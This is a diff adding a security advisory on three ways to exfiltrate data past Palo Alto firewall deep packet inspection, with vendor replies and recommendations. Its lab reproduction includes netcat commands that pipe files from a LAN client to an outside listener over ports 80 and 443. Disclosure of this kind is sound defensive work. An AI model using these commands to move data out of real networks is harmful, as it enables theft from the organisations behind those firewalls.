@@ -1,0 +1,2214 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA512
+
+## Advisory Information
+
+Title: 3 vulnerabilities in Palo Alto Deep Packet Inspection mechanism
+Advisory URL: https://pierrekim.github.io/advisories/2025-palo-alto-dpi.txt
+Blog URL: https://pierrekim.github.io/blog/2025-03-31-paloalto-dpi-3-vulnerabilities.html
+Date published: 2025-03-31
+Vendors contacted: Palo Alto
+Release mode: Released
+CVE: None
+
+
+
+## Product description
+
+> Today's Next-Generation Firewalls provide advanced protection for physical or virtual public and private cloud networks. 
+>
+> From https://www.paloaltonetworks.com/network-security/next-generation-firewall
+>
+> Understand the true identity of your applications.
+>
+> PAN-OS includes App-ID our patented traffic classification technology. It automatically discovers and controls new applications - even those that try to evade detection by masquerading as legitimate traffic, hopping ports or sneaking through firewalls under encryption. Plus, our latest post-Quantum cryptographic algorithms prohibit nonsanctioned activity, using vulnerability signatures and threat reporting.
+
+> From https://www.paloaltonetworks.com/network-security/pan-os
+
+
+
+## Vulnerabilities Summary
+
+Vulnerable versions: all versions of Palo Alto firewalls.
+
+Status of the tested versions in November 2024:
+
+- - PanOS 10.2.8: vulnerable,
+- - PanOS 10.2.9-h1: vulnerable,
+- - PanOS 11.1.4: vulnerable,
+- - PanOS 11.2.0: vulnerable.
+
+The summary of the vulnerabilities is:
+
+1. non-assigned CVE vulnerability - Exfiltration of data using TCP and 80/tcp to any IP - Deep Packet Inspection based on "service-http"
+2. non-assigned CVE vulnerability - Exfiltration of data using TCP and 443/tcp to any IP - Deep Packet Inspection based on "service-https"
+3. non-assigned CVE vulnerability - Exfiltration of data using UDP and any port to any IP
+3.1 PoC: client.py and server.py
+
+Annexes:
+
+1. Example payload for the Exfiltration of data using TCP and 80/tcp to any IP
+2. Example payload for the Exfiltration of data using UDP and any port to any IP
+
+_Miscellaneous notes_:
+
+The Report was provided in November 2024 to the Palo Alto PSIRT. Palo Alto PSIRT confirmed in January 2025 that I had observed the normal behavior of the Palo Alto's Deep Packet Inspection mechanisms and provided this statement in March 2025:
+
+> Reports 1 & 2:
+> Our firewall is designed to optimize user experience and minimize disruption. If the firewall encounters HTTP traffic it cannot confidently identify (e.g., Facebook, Reddit), the request is not automatically dropped to avoid false positives and unintended performance issues.
+> 
+> If you'd like to explore an option to drop unidentified traffic, you're welcome to submit a feature request through our support team: https://support.paloaltonetworks.com.
+> 
+> Report 3:
+> The firewall requires a certain number of packets for inspection before setting the App-ID to unknown-udp. For rules involving apps with udp/dynamic as their default, the firewall waits until an App-ID is determined before taking action. In this case, the UDP packet count fell below the threshold, so the App-ID remained insufficient-data, and the session was not dropped.
+> 
+> If you'd like the flexibility to adjust this packet threshold, you can submit a feature request through our support team: https://support.paloaltonetworks.com.
+> 
+> Security Classification:
+> Since these reports reflect feature requests rather than product defects, they do not qualify as security vulnerabilities under PAN-OS guidelines. We follow CVE Numbering Authority (CNA) Operational Rules to define vulnerabilities. Specifically, rule 4.1.7 states:
+> 
+> "Detection bypass attacks SHOULD NOT be determined to be vulnerabilities unless a product explicitly claims to detect a specific pattern and fails to do so."
+> 
+> Since PAN-OS does not explicitly claim to detect the reported behaviors, this scenario does not meet the criteria for a CVE-classified vulnerability.
+
+Because the vendor confirmed that there are no security risks and I disagreed on that, this report includes Risks and Recommendations (that I usually discard in my public security advisories). I did not include Risk levels.
+
+_Impacts_
+
+Threat actors located in a LAN can exfiltrate data without any filtering when Deep Packet Inspection firewall rules are configured without specific destination IP ranges (e.g. only relying on "application").
+
+Note: it is normal for DPI firewall to let some packets through by design. The problem mainly lies in the amount of data allowed to pass through. The official documentation (https://knowledgebase.paloaltonetworks.com/KCSArticleDetail?id=kA10g000000ClIgCAK) states that "a maximum of 4 packets or 2000 bytes of data in either direction (not including the TCP handshake)" will be transmitted before the communication is blocked. In reality, it appears instead that up to 256KB can go through the DPI engines before being effectively blocked by the appliance, so there is a factor 128 compared to the official documentation, allowing an attacker to exfiltrate terabytes of information. Also, a lot of TCP segments are allowed before the communication is effectively blocked by the appliance. These allowed amounts of data and number of packets are not configurable and are likely hardcoded inside the different Palo Alto's DPI engines.
+
+My understanding is that the official documentation confuses IP packets (also called IP datagrams) with TCP segments and UDP datagrams. Therefore, thanks to fragmentation, it is possible to send hundreds of fragmented IP packets (corresponding to 4 reassembled IP packets), which allows data exfiltration.
+
+_Recommendations_
+
+- - Do not use Deep Packet Inspection firewall rules without a specific destination IP address.
+- - In the firewall rules, always define the IPv4 and IPv6 ranges of the remote services you want to allow - note that this is likely impossible when relying on Cloud services;
+- - Use Palo Alto EDL (https://docs.paloaltonetworks.com/resources/edl-hosting-service) - note that the use of EDL will not entirely address all the issues (e.g. Facebook IP addresses are not provided).
+
+
+
+## Summary and Reproducible PoC
+
+A test network was built to analyze the behavior of the Palo Alto firewalls, and routes were defined in the `kali-lan-client` and the `kali-wan-server` to transport data through specific versions of Palo Alto VMs, as shown below.
+
+This configuration allows reaching the `kali-wan-server` from the `kali-lan-client` using different IP addresses that will route through different Palo Alto VMs (10.2.8, 10.2.9-h1, 11.1.4 and 11.2.0):    
+
+Test network:
+
+[please use the HTML version at https://pierrekim.github.io/blog/2025-03-31-paloalto-dpi-3-vulnerabilities.html]
+
+An additional Palo Alto VM was installed (PA-VM-ESX-11.1.4-license) with a license that supports advanced options (e.g. SSL/TLS interception) with a similar configuration as the existing PA-VM-ESX-11.1.4 VM. This specific VM allows testing options that can only be enabled using a license.
+
+
+## Details - Exfiltration of data using TCP and 80/tcp - Deep Packet Inspection based on "service-http"
+
+### Observations
+
+It was observed that it is possible to exfiltrate any amount of data to the Internet using TCP with TCP port 80 when the `service-http` is selected with a specific application.
+
+For example, when adding access to a website through an application (e.g. `ms-office365`, `facebook`, ...), the Service/URL will be set to `service-http` or `application-default`.
+
+The `application-default` service will automatically enable `service-http` for websites.
+
+And the `service-http` Deep Packet Inspection (DPI) mechanism will allow the exfiltration of data to any HTTP website as shown below (even to non-whitelisted websites/IPs):
+
+Basic firewall rules:
+
+[please use the HTML version at https://pierrekim.github.io/blog/2025-03-31-paloalto-dpi-3-vulnerabilities.html]
+
+[please use the HTML version at https://pierrekim.github.io/blog/2025-03-31-paloalto-dpi-3-vulnerabilities.html]
+
+Adding either `facebook` or `ms-office365` or any other website will allow data exfiltration.
+
+Since no IP addresses are specified, this rule will match any IP. This functionality is completely broken and allows an attacker to exfiltrate chunks of 21KB of data to any IP before the connection is correctly blocked by the Palo Alto firewall.
+
+The remote server will have a netcat server listening on port 80/tcp and will receive files - __this server is NOT whitelisted__.
+
+Receiving a file over TCP from the client:
+
+    kali-wan-server# for i in $(seq 1 10); do nc -l -v -p 80 > exfiltration-http-$i;sleep 1;done
+    listening on [any] 80 ...
+    192.168.1.2: inverse host lookup failed: Host name lookup failure
+    connect to [172.16.35.3] from (UNKNOWN) [192.168.1.2] 52832
+    ^C
+    listening on [any] 80 ...
+    192.168.1.2: inverse host lookup failed: Host name lookup failure
+    connect to [172.16.35.3] from (UNKNOWN) [192.168.1.2] 52838
+    ^C
+    listening on [any] 80 ...
+    192.168.1.2: inverse host lookup failed: Host name lookup failure
+    connect to [172.16.35.3] from (UNKNOWN) [192.168.1.2] 52852
+    ^C
+    listening on [any] 80 ...
+    192.168.1.2: inverse host lookup failed: Host name lookup failure
+    connect to [172.16.35.3] from (UNKNOWN) [192.168.1.2] 37414
+    ^C
+    listening on [any] 80 ...
+    192.168.1.2: inverse host lookup failed: Host name lookup failure
+    connect to [172.16.35.3] from (UNKNOWN) [192.168.1.2] 37424
+    ^C
+    listening on [any] 80 ...
+    192.168.1.2: inverse host lookup failed: Host name lookup failure
+    connect to [172.16.35.3] from (UNKNOWN) [192.168.1.2] 37436
+    ^C
+    listening on [any] 80 ...
+    192.168.1.2: inverse host lookup failed: Host name lookup failure
+    connect to [172.16.35.3] from (UNKNOWN) [192.168.1.2] 37440
+    ^C
+    listening on [any] 80 ...
+    192.168.1.2: inverse host lookup failed: Host name lookup failure
+    connect to [172.16.35.3] from (UNKNOWN) [192.168.1.2] 36256
+    ^C
+    listening on [any] 80 ...
+    192.168.1.2: inverse host lookup failed: Host name lookup failure
+    connect to [172.16.35.3] from (UNKNOWN) [192.168.1.2] 36270
+    ^C
+    listening on [any] 80 ...
+    192.168.1.2: inverse host lookup failed: Host name lookup failure
+    connect to [172.16.35.3] from (UNKNOWN) [192.168.1.2] 36280
+    ^C
+    kali-wan-server#
+
+The client sends random data to the remote server using port 80/tcp.
+
+Sending random data to any remote server on port 80/tcp (the rand.hex file was generated using `dd if=/dev/urandom bs=8K count=1 | hexdump -C > rand.hex`):
+
+    kali-wan-client% sha256sum rand.hex
+    fa0666341096d42e263a023f57714f45034eebf02e338a3b837a3b29ba10562f  rand.hex
+    kali-lan-client% for i in $(seq 1 10); do nc -v 172.16.35.3 80 < rand.hex;sleep 1.5;done
+    test [172.16.35.3] 80 (http) open
+    test [172.16.35.3] 80 (http) open
+    test [172.16.35.3] 80 (http) open
+    test [172.16.35.3] 80 (http) open
+    test [172.16.35.3] 80 (http) open
+    test [172.16.35.3] 80 (http) open
+    test [172.16.35.3] 80 (http) open
+    test [172.16.35.3] 80 (http) open
+    test [172.16.35.3] 80 (http) open
+    test [172.16.35.3] 80 (http) open
+
+And we can confirm that the remote server successfully received files from the client.
+
+Files received on the server:
+
+    kali-wan-server# ls -la
+    total 248
+    drwxr-xr-x 2 root root  4096 Oct 23 19:38 .
+    drwxr-xr-x 4 root root  4096 Oct 23 19:31 ..
+    -rw-r--r-- 1 root root 21226 Oct 23 19:38 exfiltration-http-1
+    -rw-r--r-- 1 root root 21226 Oct 23 19:39 exfiltration-http-10
+    -rw-r--r-- 1 root root 21226 Oct 23 19:38 exfiltration-http-2
+    -rw-r--r-- 1 root root 21226 Oct 23 19:38 exfiltration-http-3
+    -rw-r--r-- 1 root root 21226 Oct 23 19:38 exfiltration-http-4
+    -rw-r--r-- 1 root root 21226 Oct 23 19:38 exfiltration-http-5
+    -rw-r--r-- 1 root root 21226 Oct 23 19:39 exfiltration-http-6
+    -rw-r--r-- 1 root root 21226 Oct 23 19:39 exfiltration-http-7
+    -rw-r--r-- 1 root root 21226 Oct 23 19:39 exfiltration-http-8
+    -rw-r--r-- 1 root root 21226 Oct 23 19:39 exfiltration-http-9
+    kali-wan-server# sha256sum exfiltration-http-*  
+    fa0666341096d42e263a023f57714f45034eebf02e338a3b837a3b29ba10562f  exfiltration-http-1
+    fa0666341096d42e263a023f57714f45034eebf02e338a3b837a3b29ba10562f  exfiltration-http-2
+    fa0666341096d42e263a023f57714f45034eebf02e338a3b837a3b29ba10562f  exfiltration-http-3
+    fa0666341096d42e263a023f57714f45034eebf02e338a3b837a3b29ba10562f  exfiltration-http-4
+    fa0666341096d42e263a023f57714f45034eebf02e338a3b837a3b29ba10562f  exfiltration-http-5
+    fa0666341096d42e263a023f57714f45034eebf02e338a3b837a3b29ba10562f  exfiltration-http-6
+    fa0666341096d42e263a023f57714f45034eebf02e338a3b837a3b29ba10562f  exfiltration-http-7
+    fa0666341096d42e263a023f57714f45034eebf02e338a3b837a3b29ba10562f  exfiltration-http-8
+    fa0666341096d42e263a023f57714f45034eebf02e338a3b837a3b29ba10562f  exfiltration-http-9
+    fa0666341096d42e263a023f57714f45034eebf02e338a3b837a3b29ba10562f  exfiltration-http-10
+    kali-wan-server#
+
+Content of the random data - Random data sent to the remote server (base64 version) - found in the Annexes.
+
+An attacker can exfiltrate files with chunks of 21 KB without any filtering.
+
+It was determined that exfiltration is due to dependencies of applications.
+
+For example, the `facebook` application will import several dependencies that will enable data exfiltration.
+
+Dependencies automatically added when adding access to applications:
+
+[please use the HTML version at https://pierrekim.github.io/blog/2025-03-31-paloalto-dpi-3-vulnerabilities.html]
+
+### Risk                    
+
+Threat actors can exfiltrate data without any filtering.
+
+### Recommendation
+
+There are vulnerabilities inside the `service-http` service in Palo Alto firewalls when using a specific application (Palo Alto wording for available Deep Packet Inspection mechanisms), allowing an attacker to transmit any data to the Internet. The application linked to the `http` service provides information to the Deep Packet Inspection (DPI) mechanisms implemented in the `service-http` service to block any unwanted traffic.
+
+Any rule based on the `service-http` service (e.g. access to websites) with a specific application without a destination address is vulnerable to data exfiltration. 
+
+Do not use DPI-based rules.
+
+In the firewall rules, always specify the IPv4 and IPv6 addresses of the remote services that you want to allow.
+
+
+
+## Details - Exfiltration of data using TCP and 443/tcp - Deep Packet Inspection based on "service-https"
+
+### Observations
+
+It was observed that it is possible to exfiltrate any amount of data to the Internet using TCP with the port 443 when the `service-https` is selected with a specific application.
+
+For example, when adding access to a website through an application (e.g. `ms-office365`, `facebook`, ...), the Service/URL will be set to `service-https` or `application-default`.
+
+The `application-default` service will automatically enable `service-https` for websites.
+
+And the `service-https` Deep Packet Inspection (DPI) mechanism will allow the exfiltration of data to any HTTPS website as shown below (even to non-whitelisted websites/IPs).
+
+Basic firewall rules:
+
+[please use the HTML version at https://pierrekim.github.io/blog/2025-03-31-paloalto-dpi-3-vulnerabilities.html]
+
+[please use the HTML version at https://pierrekim.github.io/blog/2025-03-31-paloalto-dpi-3-vulnerabilities.html]
+
+Adding either `reddit`, `facebook` or `ms-office365` or any other website will allow data exfiltration.
+
+Since no IP addresses are specified, this rule will match any IP. This functionality is completely broken and allows an attacker to exfiltrate chunks of 5KB of data to any IP before the connection is correctly blocked by the Palo Alto firewall.
+
+The remote server will have a netcat server listening on port 443/tcp and will receive files - __this server is NOT whitelisted__.
+
+Receiving a file over TCP from the client:
+
+    kali-wan-server# for i in $(seq 1 10); do nc -l -v -p 443 > exfiltration-https-reddit-$i;sleep 1;done
+    listening on [any] 443 ...
+    192.168.1.2: inverse host lookup failed: Host name lookup failure
+    connect to [172.16.35.3] from (UNKNOWN) [192.168.1.2] 55438
+    ^C
+    listening on [any] 443 ...
+    192.168.1.2: inverse host lookup failed: Host name lookup failure
+    connect to [172.16.35.3] from (UNKNOWN) [192.168.1.2] 55454
+    ^C
+    listening on [any] 443 ...
+    192.168.1.2: inverse host lookup failed: Host name lookup failure
+    connect to [172.16.35.3] from (UNKNOWN) [192.168.1.2] 55460
+    ^C
+    listening on [any] 443 ...
+    192.168.1.2: inverse host lookup failed: Host name lookup failure
+    connect to [172.16.35.3] from (UNKNOWN) [192.168.1.2] 43658
+    ^C
+    listening on [any] 443 ...
+    192.168.1.2: inverse host lookup failed: Host name lookup failure
+    connect to [172.16.35.3] from (UNKNOWN) [192.168.1.2] 43664
+    ^C
+    listening on [any] 443 ...
+    192.168.1.2: inverse host lookup failed: Host name lookup failure
+    connect to [172.16.35.3] from (UNKNOWN) [192.168.1.2] 43682
+    ^C
+    listening on [any] 443 ...
+    192.168.1.2: inverse host lookup failed: Host name lookup failure
+    connect to [172.16.35.3] from (UNKNOWN) [192.168.1.2] 43694
+    ^C
+    listening on [any] 443 ...
+    192.168.1.2: inverse host lookup failed: Host name lookup failure
+    connect to [172.16.35.3] from (UNKNOWN) [192.168.1.2] 60390
+    ^C
+    listening on [any] 443 ...
+    192.168.1.2: inverse host lookup failed: Host name lookup failure
+    connect to [172.16.35.3] from (UNKNOWN) [192.168.1.2] 60406
+    ^C
+    listening on [any] 443 ...
+    192.168.1.2: inverse host lookup failed: Host name lookup failure
+    connect to [172.16.35.3] from (UNKNOWN) [192.168.1.2] 60416
+    ^C
+    kali-wan-server#
+
+The client sends random data to the remote server using port 443/tcp.
+
+Sending random data to any remote server on port 443/tcp:
+
+    kali-lan-client# for i in $(seq 1 10); do cat /dev/urandom | hexdump -C | nc -v 172.16.35.3 443;sleep 1;done
+    test [172.16.35.3] 443 (https) open
+    ^C
+    test [172.16.35.3] 443 (https) open
+    ^C
+    test [172.16.35.3] 443 (https) open
+    ^C
+    test [172.16.35.3] 443 (https) open
+    ^C
+    test [172.16.35.3] 443 (https) open
+    ^C
+    test [172.16.35.3] 443 (https) open
+    ^C
+    test [172.16.35.3] 443 (https) open
+    ^C
+    test [172.16.35.3] 443 (https) open
+    ^C
+    test [172.16.35.3] 443 (https) open
+    ^C
+    test [172.16.35.3] 443 (https) open
+    ^C
+    kali-lan-client#
+
+We can confirm that the remote server successfully received files from the client.
+
+Files received on the server:
+
+    kali-wan-server# ls -la
+    total 88
+    drwxr-xr-x 2 root root 4096 Oct 23 19:21 .
+    drwxr-xr-x 3 root root 4096 Oct 23 19:18 ..
+    -rw-r--r-- 1 root root 5792 Oct 23 19:21 exfiltration-https-reddit-1
+    -rw-r--r-- 1 root root 5792 Oct 23 19:21 exfiltration-https-reddit-10
+    -rw-r--r-- 1 root root 5792 Oct 23 19:21 exfiltration-https-reddit-2
+    -rw-r--r-- 1 root root 5792 Oct 23 19:21 exfiltration-https-reddit-3
+    -rw-r--r-- 1 root root 5792 Oct 23 19:21 exfiltration-https-reddit-4
+    -rw-r--r-- 1 root root 5792 Oct 23 19:21 exfiltration-https-reddit-5
+    -rw-r--r-- 1 root root 5792 Oct 23 19:21 exfiltration-https-reddit-6
+    -rw-r--r-- 1 root root 5792 Oct 23 19:21 exfiltration-https-reddit-7
+    -rw-r--r-- 1 root root 5792 Oct 23 19:21 exfiltration-https-reddit-8
+    -rw-r--r-- 1 root root 5792 Oct 23 19:21 exfiltration-https-reddit-9
+    kali-wan-server# cat exfiltration-https-reddit-1
+    00000000  56 0a 71 05 f1 00 56 96  25 88 e4 ab 8a 9a 94 4e  |V.q...V.%......N|
+    00000010  10 e1 62 26 72 67 bb 93  61 c6 26 56 f5 8a c0 ce  |..b&rg..a.&V....|
+    00000020  a0 a9 b5 27 ea d6 81 c4  3a 0a 44 6a d5 6e 52 d3  |...'....:.Dj.nR.|
+    00000030  44 2d c1 06 f4 46 12 0d  8f e7 96 63 35 25 26 cb  |D-...F.....c5%&.|
+    00000040  18 c5 3b 1b a8 a6 53 a6  cc b6 ed cc d7 a3 fa 86  |..;...S.........|
+    00000050  94 d5 43 c8 08 a0 f1 01  82 d7 16 ed 36 48 0e 4f  |..C.........6H.O|
+    00000060  65 28 4d e5 d7 bf 20 f4  b2 00 b8 89 b8 0d 52 2c  |e(M... .......R,|
+    00000070  ba b6 42 9c 67 87 9c 94  e1 4a d7 8c 2b e2 97 79  |..B.g....J..+..y|
+    00000080  74 b8 63 b2 c3 fd 26 0e  1d b9 00 65 ec 79 a3 f7  |t.c...&....e.y..|
+    00000090  cc eb ef 18 61 dc 0b b6  72 81 36 e2 c7 34 9b 79  |....a...r.6..4.y|
+    000000a0  c7 ac ea 81 48 ca 0a 17  80 7c df dd ca 0d 6d ba  |....H....|....m.|
+    000000b0  fe 17 a3 f4 3c 94 fa f7  7b 10 56 3b a9 63 65 2b  |....<...{.V;.ce+|
+    000000c0  f4 a1 fd a1 36 85 06 28  d8 80 50 d5 1b 73 ee ad  |....6..(..P..s..|
+    000000d0  47 8c d2 eb 73 44 d3 76  be cb 0d c7 a7 ea 7b 1e  |G...sD.v......{.|
+    000000e0  24 a0 e1 78 80 17 7d cf  5c 90 7c 56 a2 ac 38 e5  |$..x..}.\.|V..8.|
+    000000f0  48 ff 7d d8 92 a7 a9 dc  9e 50 48 e4 37 3e 39 0b  |H.}......PH.7>9.|
+    00000100  bb 40 3c 8b d7 54 c3 41  c3 b7 18 88 21 c9 17 e7  |.@<..T.A....!...|
+    00000110  52 e4 bc 8c a8 d2 93 45  35 7a 01 f6 fb e7 14 93  |R......E5z......|
+    00000120  d1 9c 86 2f b2 72 c7 0a  74 83 cc 7e 35 95 00 44  |.../.r..t..~5..D|
+    00000130  37 06 71 6d 0b 4f 02 5f  6d e1 89 c9 74 a5 fd e5  |7.qm.O._m...t...|
+    00000140  66 49 ef e7 23 c5 0e f3  34 7d 4a 18 35 8d 19 47  |fI..#...4}J.5..G|
+    00000150  83 7e 5c 96 57 13 30 cf  0a d8 f3 7c ff db 41 07  |.~\.W.0....|..A.|
+    00000160  50 04 a6 4b 4f 12 7f 59  09 90 6e 98 09 50 cd e0  |P..KO..Y..n..P..|
+    00000170  b0 32 6a 0e b6 1c 7e 4f  81 bf 71 e1 5f a4 63 75  |.2j...~O..q._.cu|
+    00000180  ba ee dc e9 d5 46 55 99  8e 8f 94 e1 a1 5d ea d4  |.....FU......]..|
+    00000190  c1 e4 90 89 f9 3d 33 3c  e0 38 f9 26 e0 76 9c f1  |.....=3<.8.&.v..|
+    000001a0  fb 71 57 4d 82 24 af ad  ca 5f 66 cd cc a1 db d9  |.qWM.$..._f.....|
+    000001b0  28 2e f7 22 e0 fe de 01  c7 83 b1 20 6b 1d e6 ec  |(.."....... k...|
+    000001c0  e1 62 f0 df de e1 86 c3  d7 d6 3a 1c 7c 33 a8 41  |.b........:.|3.A|
+    000001d0  bf 51 8c 47 d4 be f1 fc  b5 70 18 1c 0e a3 e9 4e  |.Q.G.....p.....N|
+    000001e0  67 0e 52 d3 31 d3 be d3  90 f8 59 c4 99 56 1a 84  |g.R.1.....Y..V..|
+    000001f0  fd 25 d0 d2 0c 6b ec fc  e0 d5 60 dc fe c2 9f 7c  |.%...k....`....||
+    00000200  d9 67 3b f9 10 5e db 27  9c 0c 72 9c 9b df eb c6  |.g;..^.'..r.....|
+    00000210  2b c6 cb d4 6d 4e 06 56  13 a0 02 66 05 bb 94 7a  |+...mN.V...f...z|
+    00000220  01 8f 0b 1e c5 c1 39 4e  62 2c ab 2d f3 38 ee b4  |......9Nb,.-.8..|
+    00000230  09 a2 9f 02 2d d8 e6 1a  df e1 e6 56 d0 5a 8f 50  |....-......V.Z.P|
+    00000240  cc 10 fa 55 64 aa 78 f8  0c 1a 53 f9 da 0d 25 e8  |...Ud.x...S...%.|
+    00000250  1d e2 21 83 a6 0a 8f c1  e0 46 d2 fb 2b dd 2c 2e  |..!......F..+.,.|
+    00000260  f1 e7 55 59 1f ae e9 03  2a 6b 49 24 85 65 f8 4c  |..UY....*kI$.e.L|
+    00000270  ee df b6 34 4f 15 08 71  9b a3 b7 24 38 a4 80 c9  |...4O..q...$8...|
+    00000280  84 e2 a0 08 ba 93 37 f6  40 6d 30 93 15 48 65 52  |......7.@m0..HeR|
+    00000290  5e 74 f1 88 6d 5b 46 c4  2c 94 66 c4 32 c5 35 94  |^t..m[F.,.f.2.5.|
+    000002a0  65 e4 8d 97 4e 18 11 ba  0c a0 81 3e 93 0e 7b c0  |e...N......>..{.|
+    000002b0  cb 6f 52 f4 c2 15 d8 25  2c 7a b1 70 1f dc 4a 14  |.oR....%,z.p..J.|
+    000002c0  ad 72 4b 48 af df 92 a6  b8 9e 5b d3 e9 dc 22 be  |.rKH......[...".|
+    000002d0  f5 53 2a d7 ef 4b 2f 58  7b f3 1e 4e b1 6e b5 3f  |.S*..K/X{..N.n.?|
+    000002e0  17 e2 1b 83 58 c3 0f fa  60 d9 87 05 2c 89 7e bc  |....X...`...,.~.|
+    000002f0  ec 1f 31 8a 08 aa 20 bb  ea a0 75 c8 bf a5 25 44  |..1... ...u...%D|
+    00000300  e7 46 21 78 27 c0 ca 87  0f 4e b8 fc 4e 66 92 c5  |.F!x'....N..Nf..|
+    00000310  bc 9a a2 84 9d aa fd e1  68 39 47 be d8 62 66 26  |........h9G..bf&|
+    00000320  87 ec 93 df 53 94 2a a0  f1 35 0f 82 e6 cc 9c bd  |....S.*..5......|
+    00000330  a3 e7 30 f6 6a d4 c2 73  37 3a e6 39 d3 1e 6d 98  |..0.j..s7:.9..m.|
+    00000340  bf 93 22 d2 44 59 46 20  61 fd 0c 65 84 58 2c 37  |..".DYF a..e.X,7|
+    00000350  84 da 05 3a 73 b0 15 4d  38 9c 7a 72 1b ae c5 3f  |...:s..M8.zr...?|
+    00000360  ab eb 47 a1 0d a0 45 32  7a 70 89 31 03 14 0c 5c  |..G...E2zp.1...\|
+    00000370  26 dc bc 96 6c 55 67 60  9b fa 05 88 91 61 1c 2c  |&...lUg`.....a.,|
+    00000380  80 59 be b2 25 32 90 e3  25 a5 26 2c 61 9f 4d ac  |.Y..%2..%.&,a.M.|
+    00000390  ec ca aa 63 54 e7 1b f7  32 d1 18 14 f7 43 ae ba  |...cT...2....C..|
+    000003a0  87 75 2c 90 5d b9 ed 6b  a9 2f 81 c3 75 29 e0 0c  |.u,.]..k./..u)..|
+    000003b0  99 94 89 d5 41 9b b9 47  cb 50 c6 7f be d8 fa 10  |....A..G.P......|
+    000003c0  23 10 83 31 86 b6 4d 1e  e8 63 9f d8 8b 25 15 f2  |#..1..M..c...%..|
+    000003d0  00 f1 2f ee 51 60 1e c7  e3 22 e3 a4 6c 4c b8 3c  |../.Q`..."..lL.<|
+    000003e0  6a 30 31 d0 38 f0 f5 13  5e 20 5e a3 60 1a a7 2c  |j01.8...^ ^.`..,|
+    000003f0  16 f9 71 2c d5 2b a3 36  96 c2 d2 90 6a 57 89 18  |..q,.+.6....jW..|
+    00000400  7e 0b f9 c2 63 ce eb db  f2 ce 84 9d a0 ab 6d b0  |~...c.........m.|
+    00000410  90 3a bd a7 5d 6f af d5  72 d2 27 0a 5b 32 f2 06  |.:..]o..r.'.[2..|
+    00000420  f2 c9 e8 1d c9 4e 1c 54  ca f1 39 80 1f 82 bb 9d  |.....N.T..9.....|
+    00000430  d3 ef 01 3d e8 5f d9 db  24 bf f3 7c a6 5c 7e ad  |...=._..$..|.\~.|
+    00000440  61 f7 a5 9b a4 e3 2b 29  76 b1 62 c3 89 55 82 91  |a.....+)v.b..U..|
+    00000450  f8 c3 3b 51 9f fa 01 db  38 cd b1 3c 2d cb 94 8e  |..;Q....8..<-...|
+    00000460  54 1c 0c 84 69 5f 11 12  de 46 ce b5 d5 82 9c 84  |T...i_...F......|
+    00000470  52 69 a1 2a 29 64 95 5b  eb cb 8c af 0a 83 5d aa  |Ri.*)d.[......].|
+    00000480  93 69 e7 e5 aa 88 35 98  60 74 3b e7 fd 02 a4 93  |.i....5.`t;.....|
+    00000490  a1 e2 4b 3f 83
+    kali-wan-server#
+
+An attacker can exfiltrate files without any filtering. For example, `/usr/share/doc/libxml-writer-perl/examples/directory-as-atom.pl`.
+
+Sending a file over TCP to 172.16.35.3:443/tcp:
+
+    kali-lan-client# ls -la /usr/share/doc/libxml-writer-perl/examples/directory-as-atom.pl
+    -rwxr-xr-x 1 root root 3470 Apr 24  2020 /usr/share/doc/libxml-writer-perl/examples/directory-as-atom.pl
+    kali-lan-client# cat /usr/share/doc/libxml-writer-perl/examples/directory-as-atom.pl| nc -v 172.16.35.3 443 
+    test [172.16.35.3] 443 (https) open
+    ^C
+    kali-lan-client#
+
+And the server (172.16.35.3) received the file:
+
+    kali-wan-server# nc -l -v -p 443 > directory-as-atom.pl     
+    listening on [any] 443 ...
+    192.168.1.2: inverse host lookup failed: Host name lookup failure
+    connect to [172.16.35.3] from (UNKNOWN) [192.168.1.2] 54290
+
+    kali-wan-server# ls -la directory-as-atom.pl
+    -rw-r--r-- 1 root root 3470 Oct 23 19:24 directory-as-atom.pl
+
+    kali-wan-server# cat directory-as-atom.pl
+    #!/usr/bin/perl -w
+    
+    # A full example that presents a directory as an Atom feed
+    # It demonstrates namespace and formatting control.
+    # Intended to productise the /junk convention.
+    
+    # Usage: directory-as-atom.pl <local directory> <public URL> [feed title] [feed subtitle]
+    
+    # e.g., directory-as-atom.pl /home/user/public_html/junk http://www.example.com/~user/junk/ >index.atom
+    
+    use strict;
+    
+    use DirHandle;
+    use URI::URL;
+    use DateTime;
+    
+    use XML::Writer;
+    
+    my ($dir, $base, $title, $subtitle) = @ARGV;
+    
+    defined($base) or die "Usage: directory-as-atom.pl <local directory> <public URL> [feed title] [feed subtitle]";
+    
+    $dir ||= '.';
+    
+    $title ||= '/junk/';
+    $subtitle ||= 'ls -ltr $dir | head -10';
+    
+    
+    my $uid = (stat($dir))[4];
+    
+    my $dh = DirHandle->new($dir) || die "Unable to opendir $dir: $!";
+    
+    my @de;
+    
+    while(my $e = $dh->read()) {
+            # Skip dotfiles
+            next if ($e =~ /^\./);
+    
+            my $n = "$dir/$e";
+    
+            next unless (-f $n);
+    
+            my ($mtime, $bytes) = (stat($n))[9,7];
+    
+            my $desc; # undef, for now
+    
+            if (defined($mtime)) {push(@de, [$e, $mtime, $desc, $bytes])};
+    }
+    
+    undef($dh);
+    [...]
+    kali-wan-server#
+
+### Risk
+
+Threat actors can exfiltrate data without any filtering.
+
+### Recommendation
+
+There are vulnerabilities inside the `service-https` service in Palo Alto firewalls when using a specific application (Palo Alto wording for available Deep Packet Inspection mechanisms), allowing an attacker to transmit any data to the Internet. The application linked to the `https` service provides information to the Deep Packet Inspection (DPI) mechanisms implemented in the `service-https` service to block any unwanted traffic.
+
+Any rule based on the `service-https` service (e.g. access to websites) with a specific application without a destination address is vulnerable to data exfiltration.
+
+Do not use DPI-based rules.
+
+In the firewall rules, always specify the IPv4 and IPv6 addresses of the remote services that you want to allow.
+
+
+
+## Exfiltration of data using UDP and any port
+
+### Observations
+
+It was observed that it is possible to exfiltrate any amount of data to the Internet using UDP when adding specific applications.
+
+For example, when adding access to a website through an application (e.g. `ms-office365`, ...), the Service/URL will be set to `application-default`.
+
+The `application-default` service will automatically allow communication to any remote UDP port for `ms-office365`, allowing the exfiltration of data to any remote IP as shown below.
+
+Basic firewall rules:
+
+[please use the HTML version at https://pierrekim.github.io/blog/2025-03-31-paloalto-dpi-3-vulnerabilities.html]
+
+[please use the HTML version at https://pierrekim.github.io/blog/2025-03-31-paloalto-dpi-3-vulnerabilities.html]
+
+The "full-https-access" firewall rule only provides access to reddit (application: `reddit` with service: `service-https`) and is unrelated to this test.
+
+Since no IP addresses are specified, this rule will match any IP. This functionality is completely broken and allows an attacker to exfiltrate multiple 64KB-chunks of data to any IP before the connection is correctly blocked by the Palo Alto firewall.
+
+The remote server will have a netcat server listening on port 82/udp and will receive files - __this server is NOT whitelisted__.
+
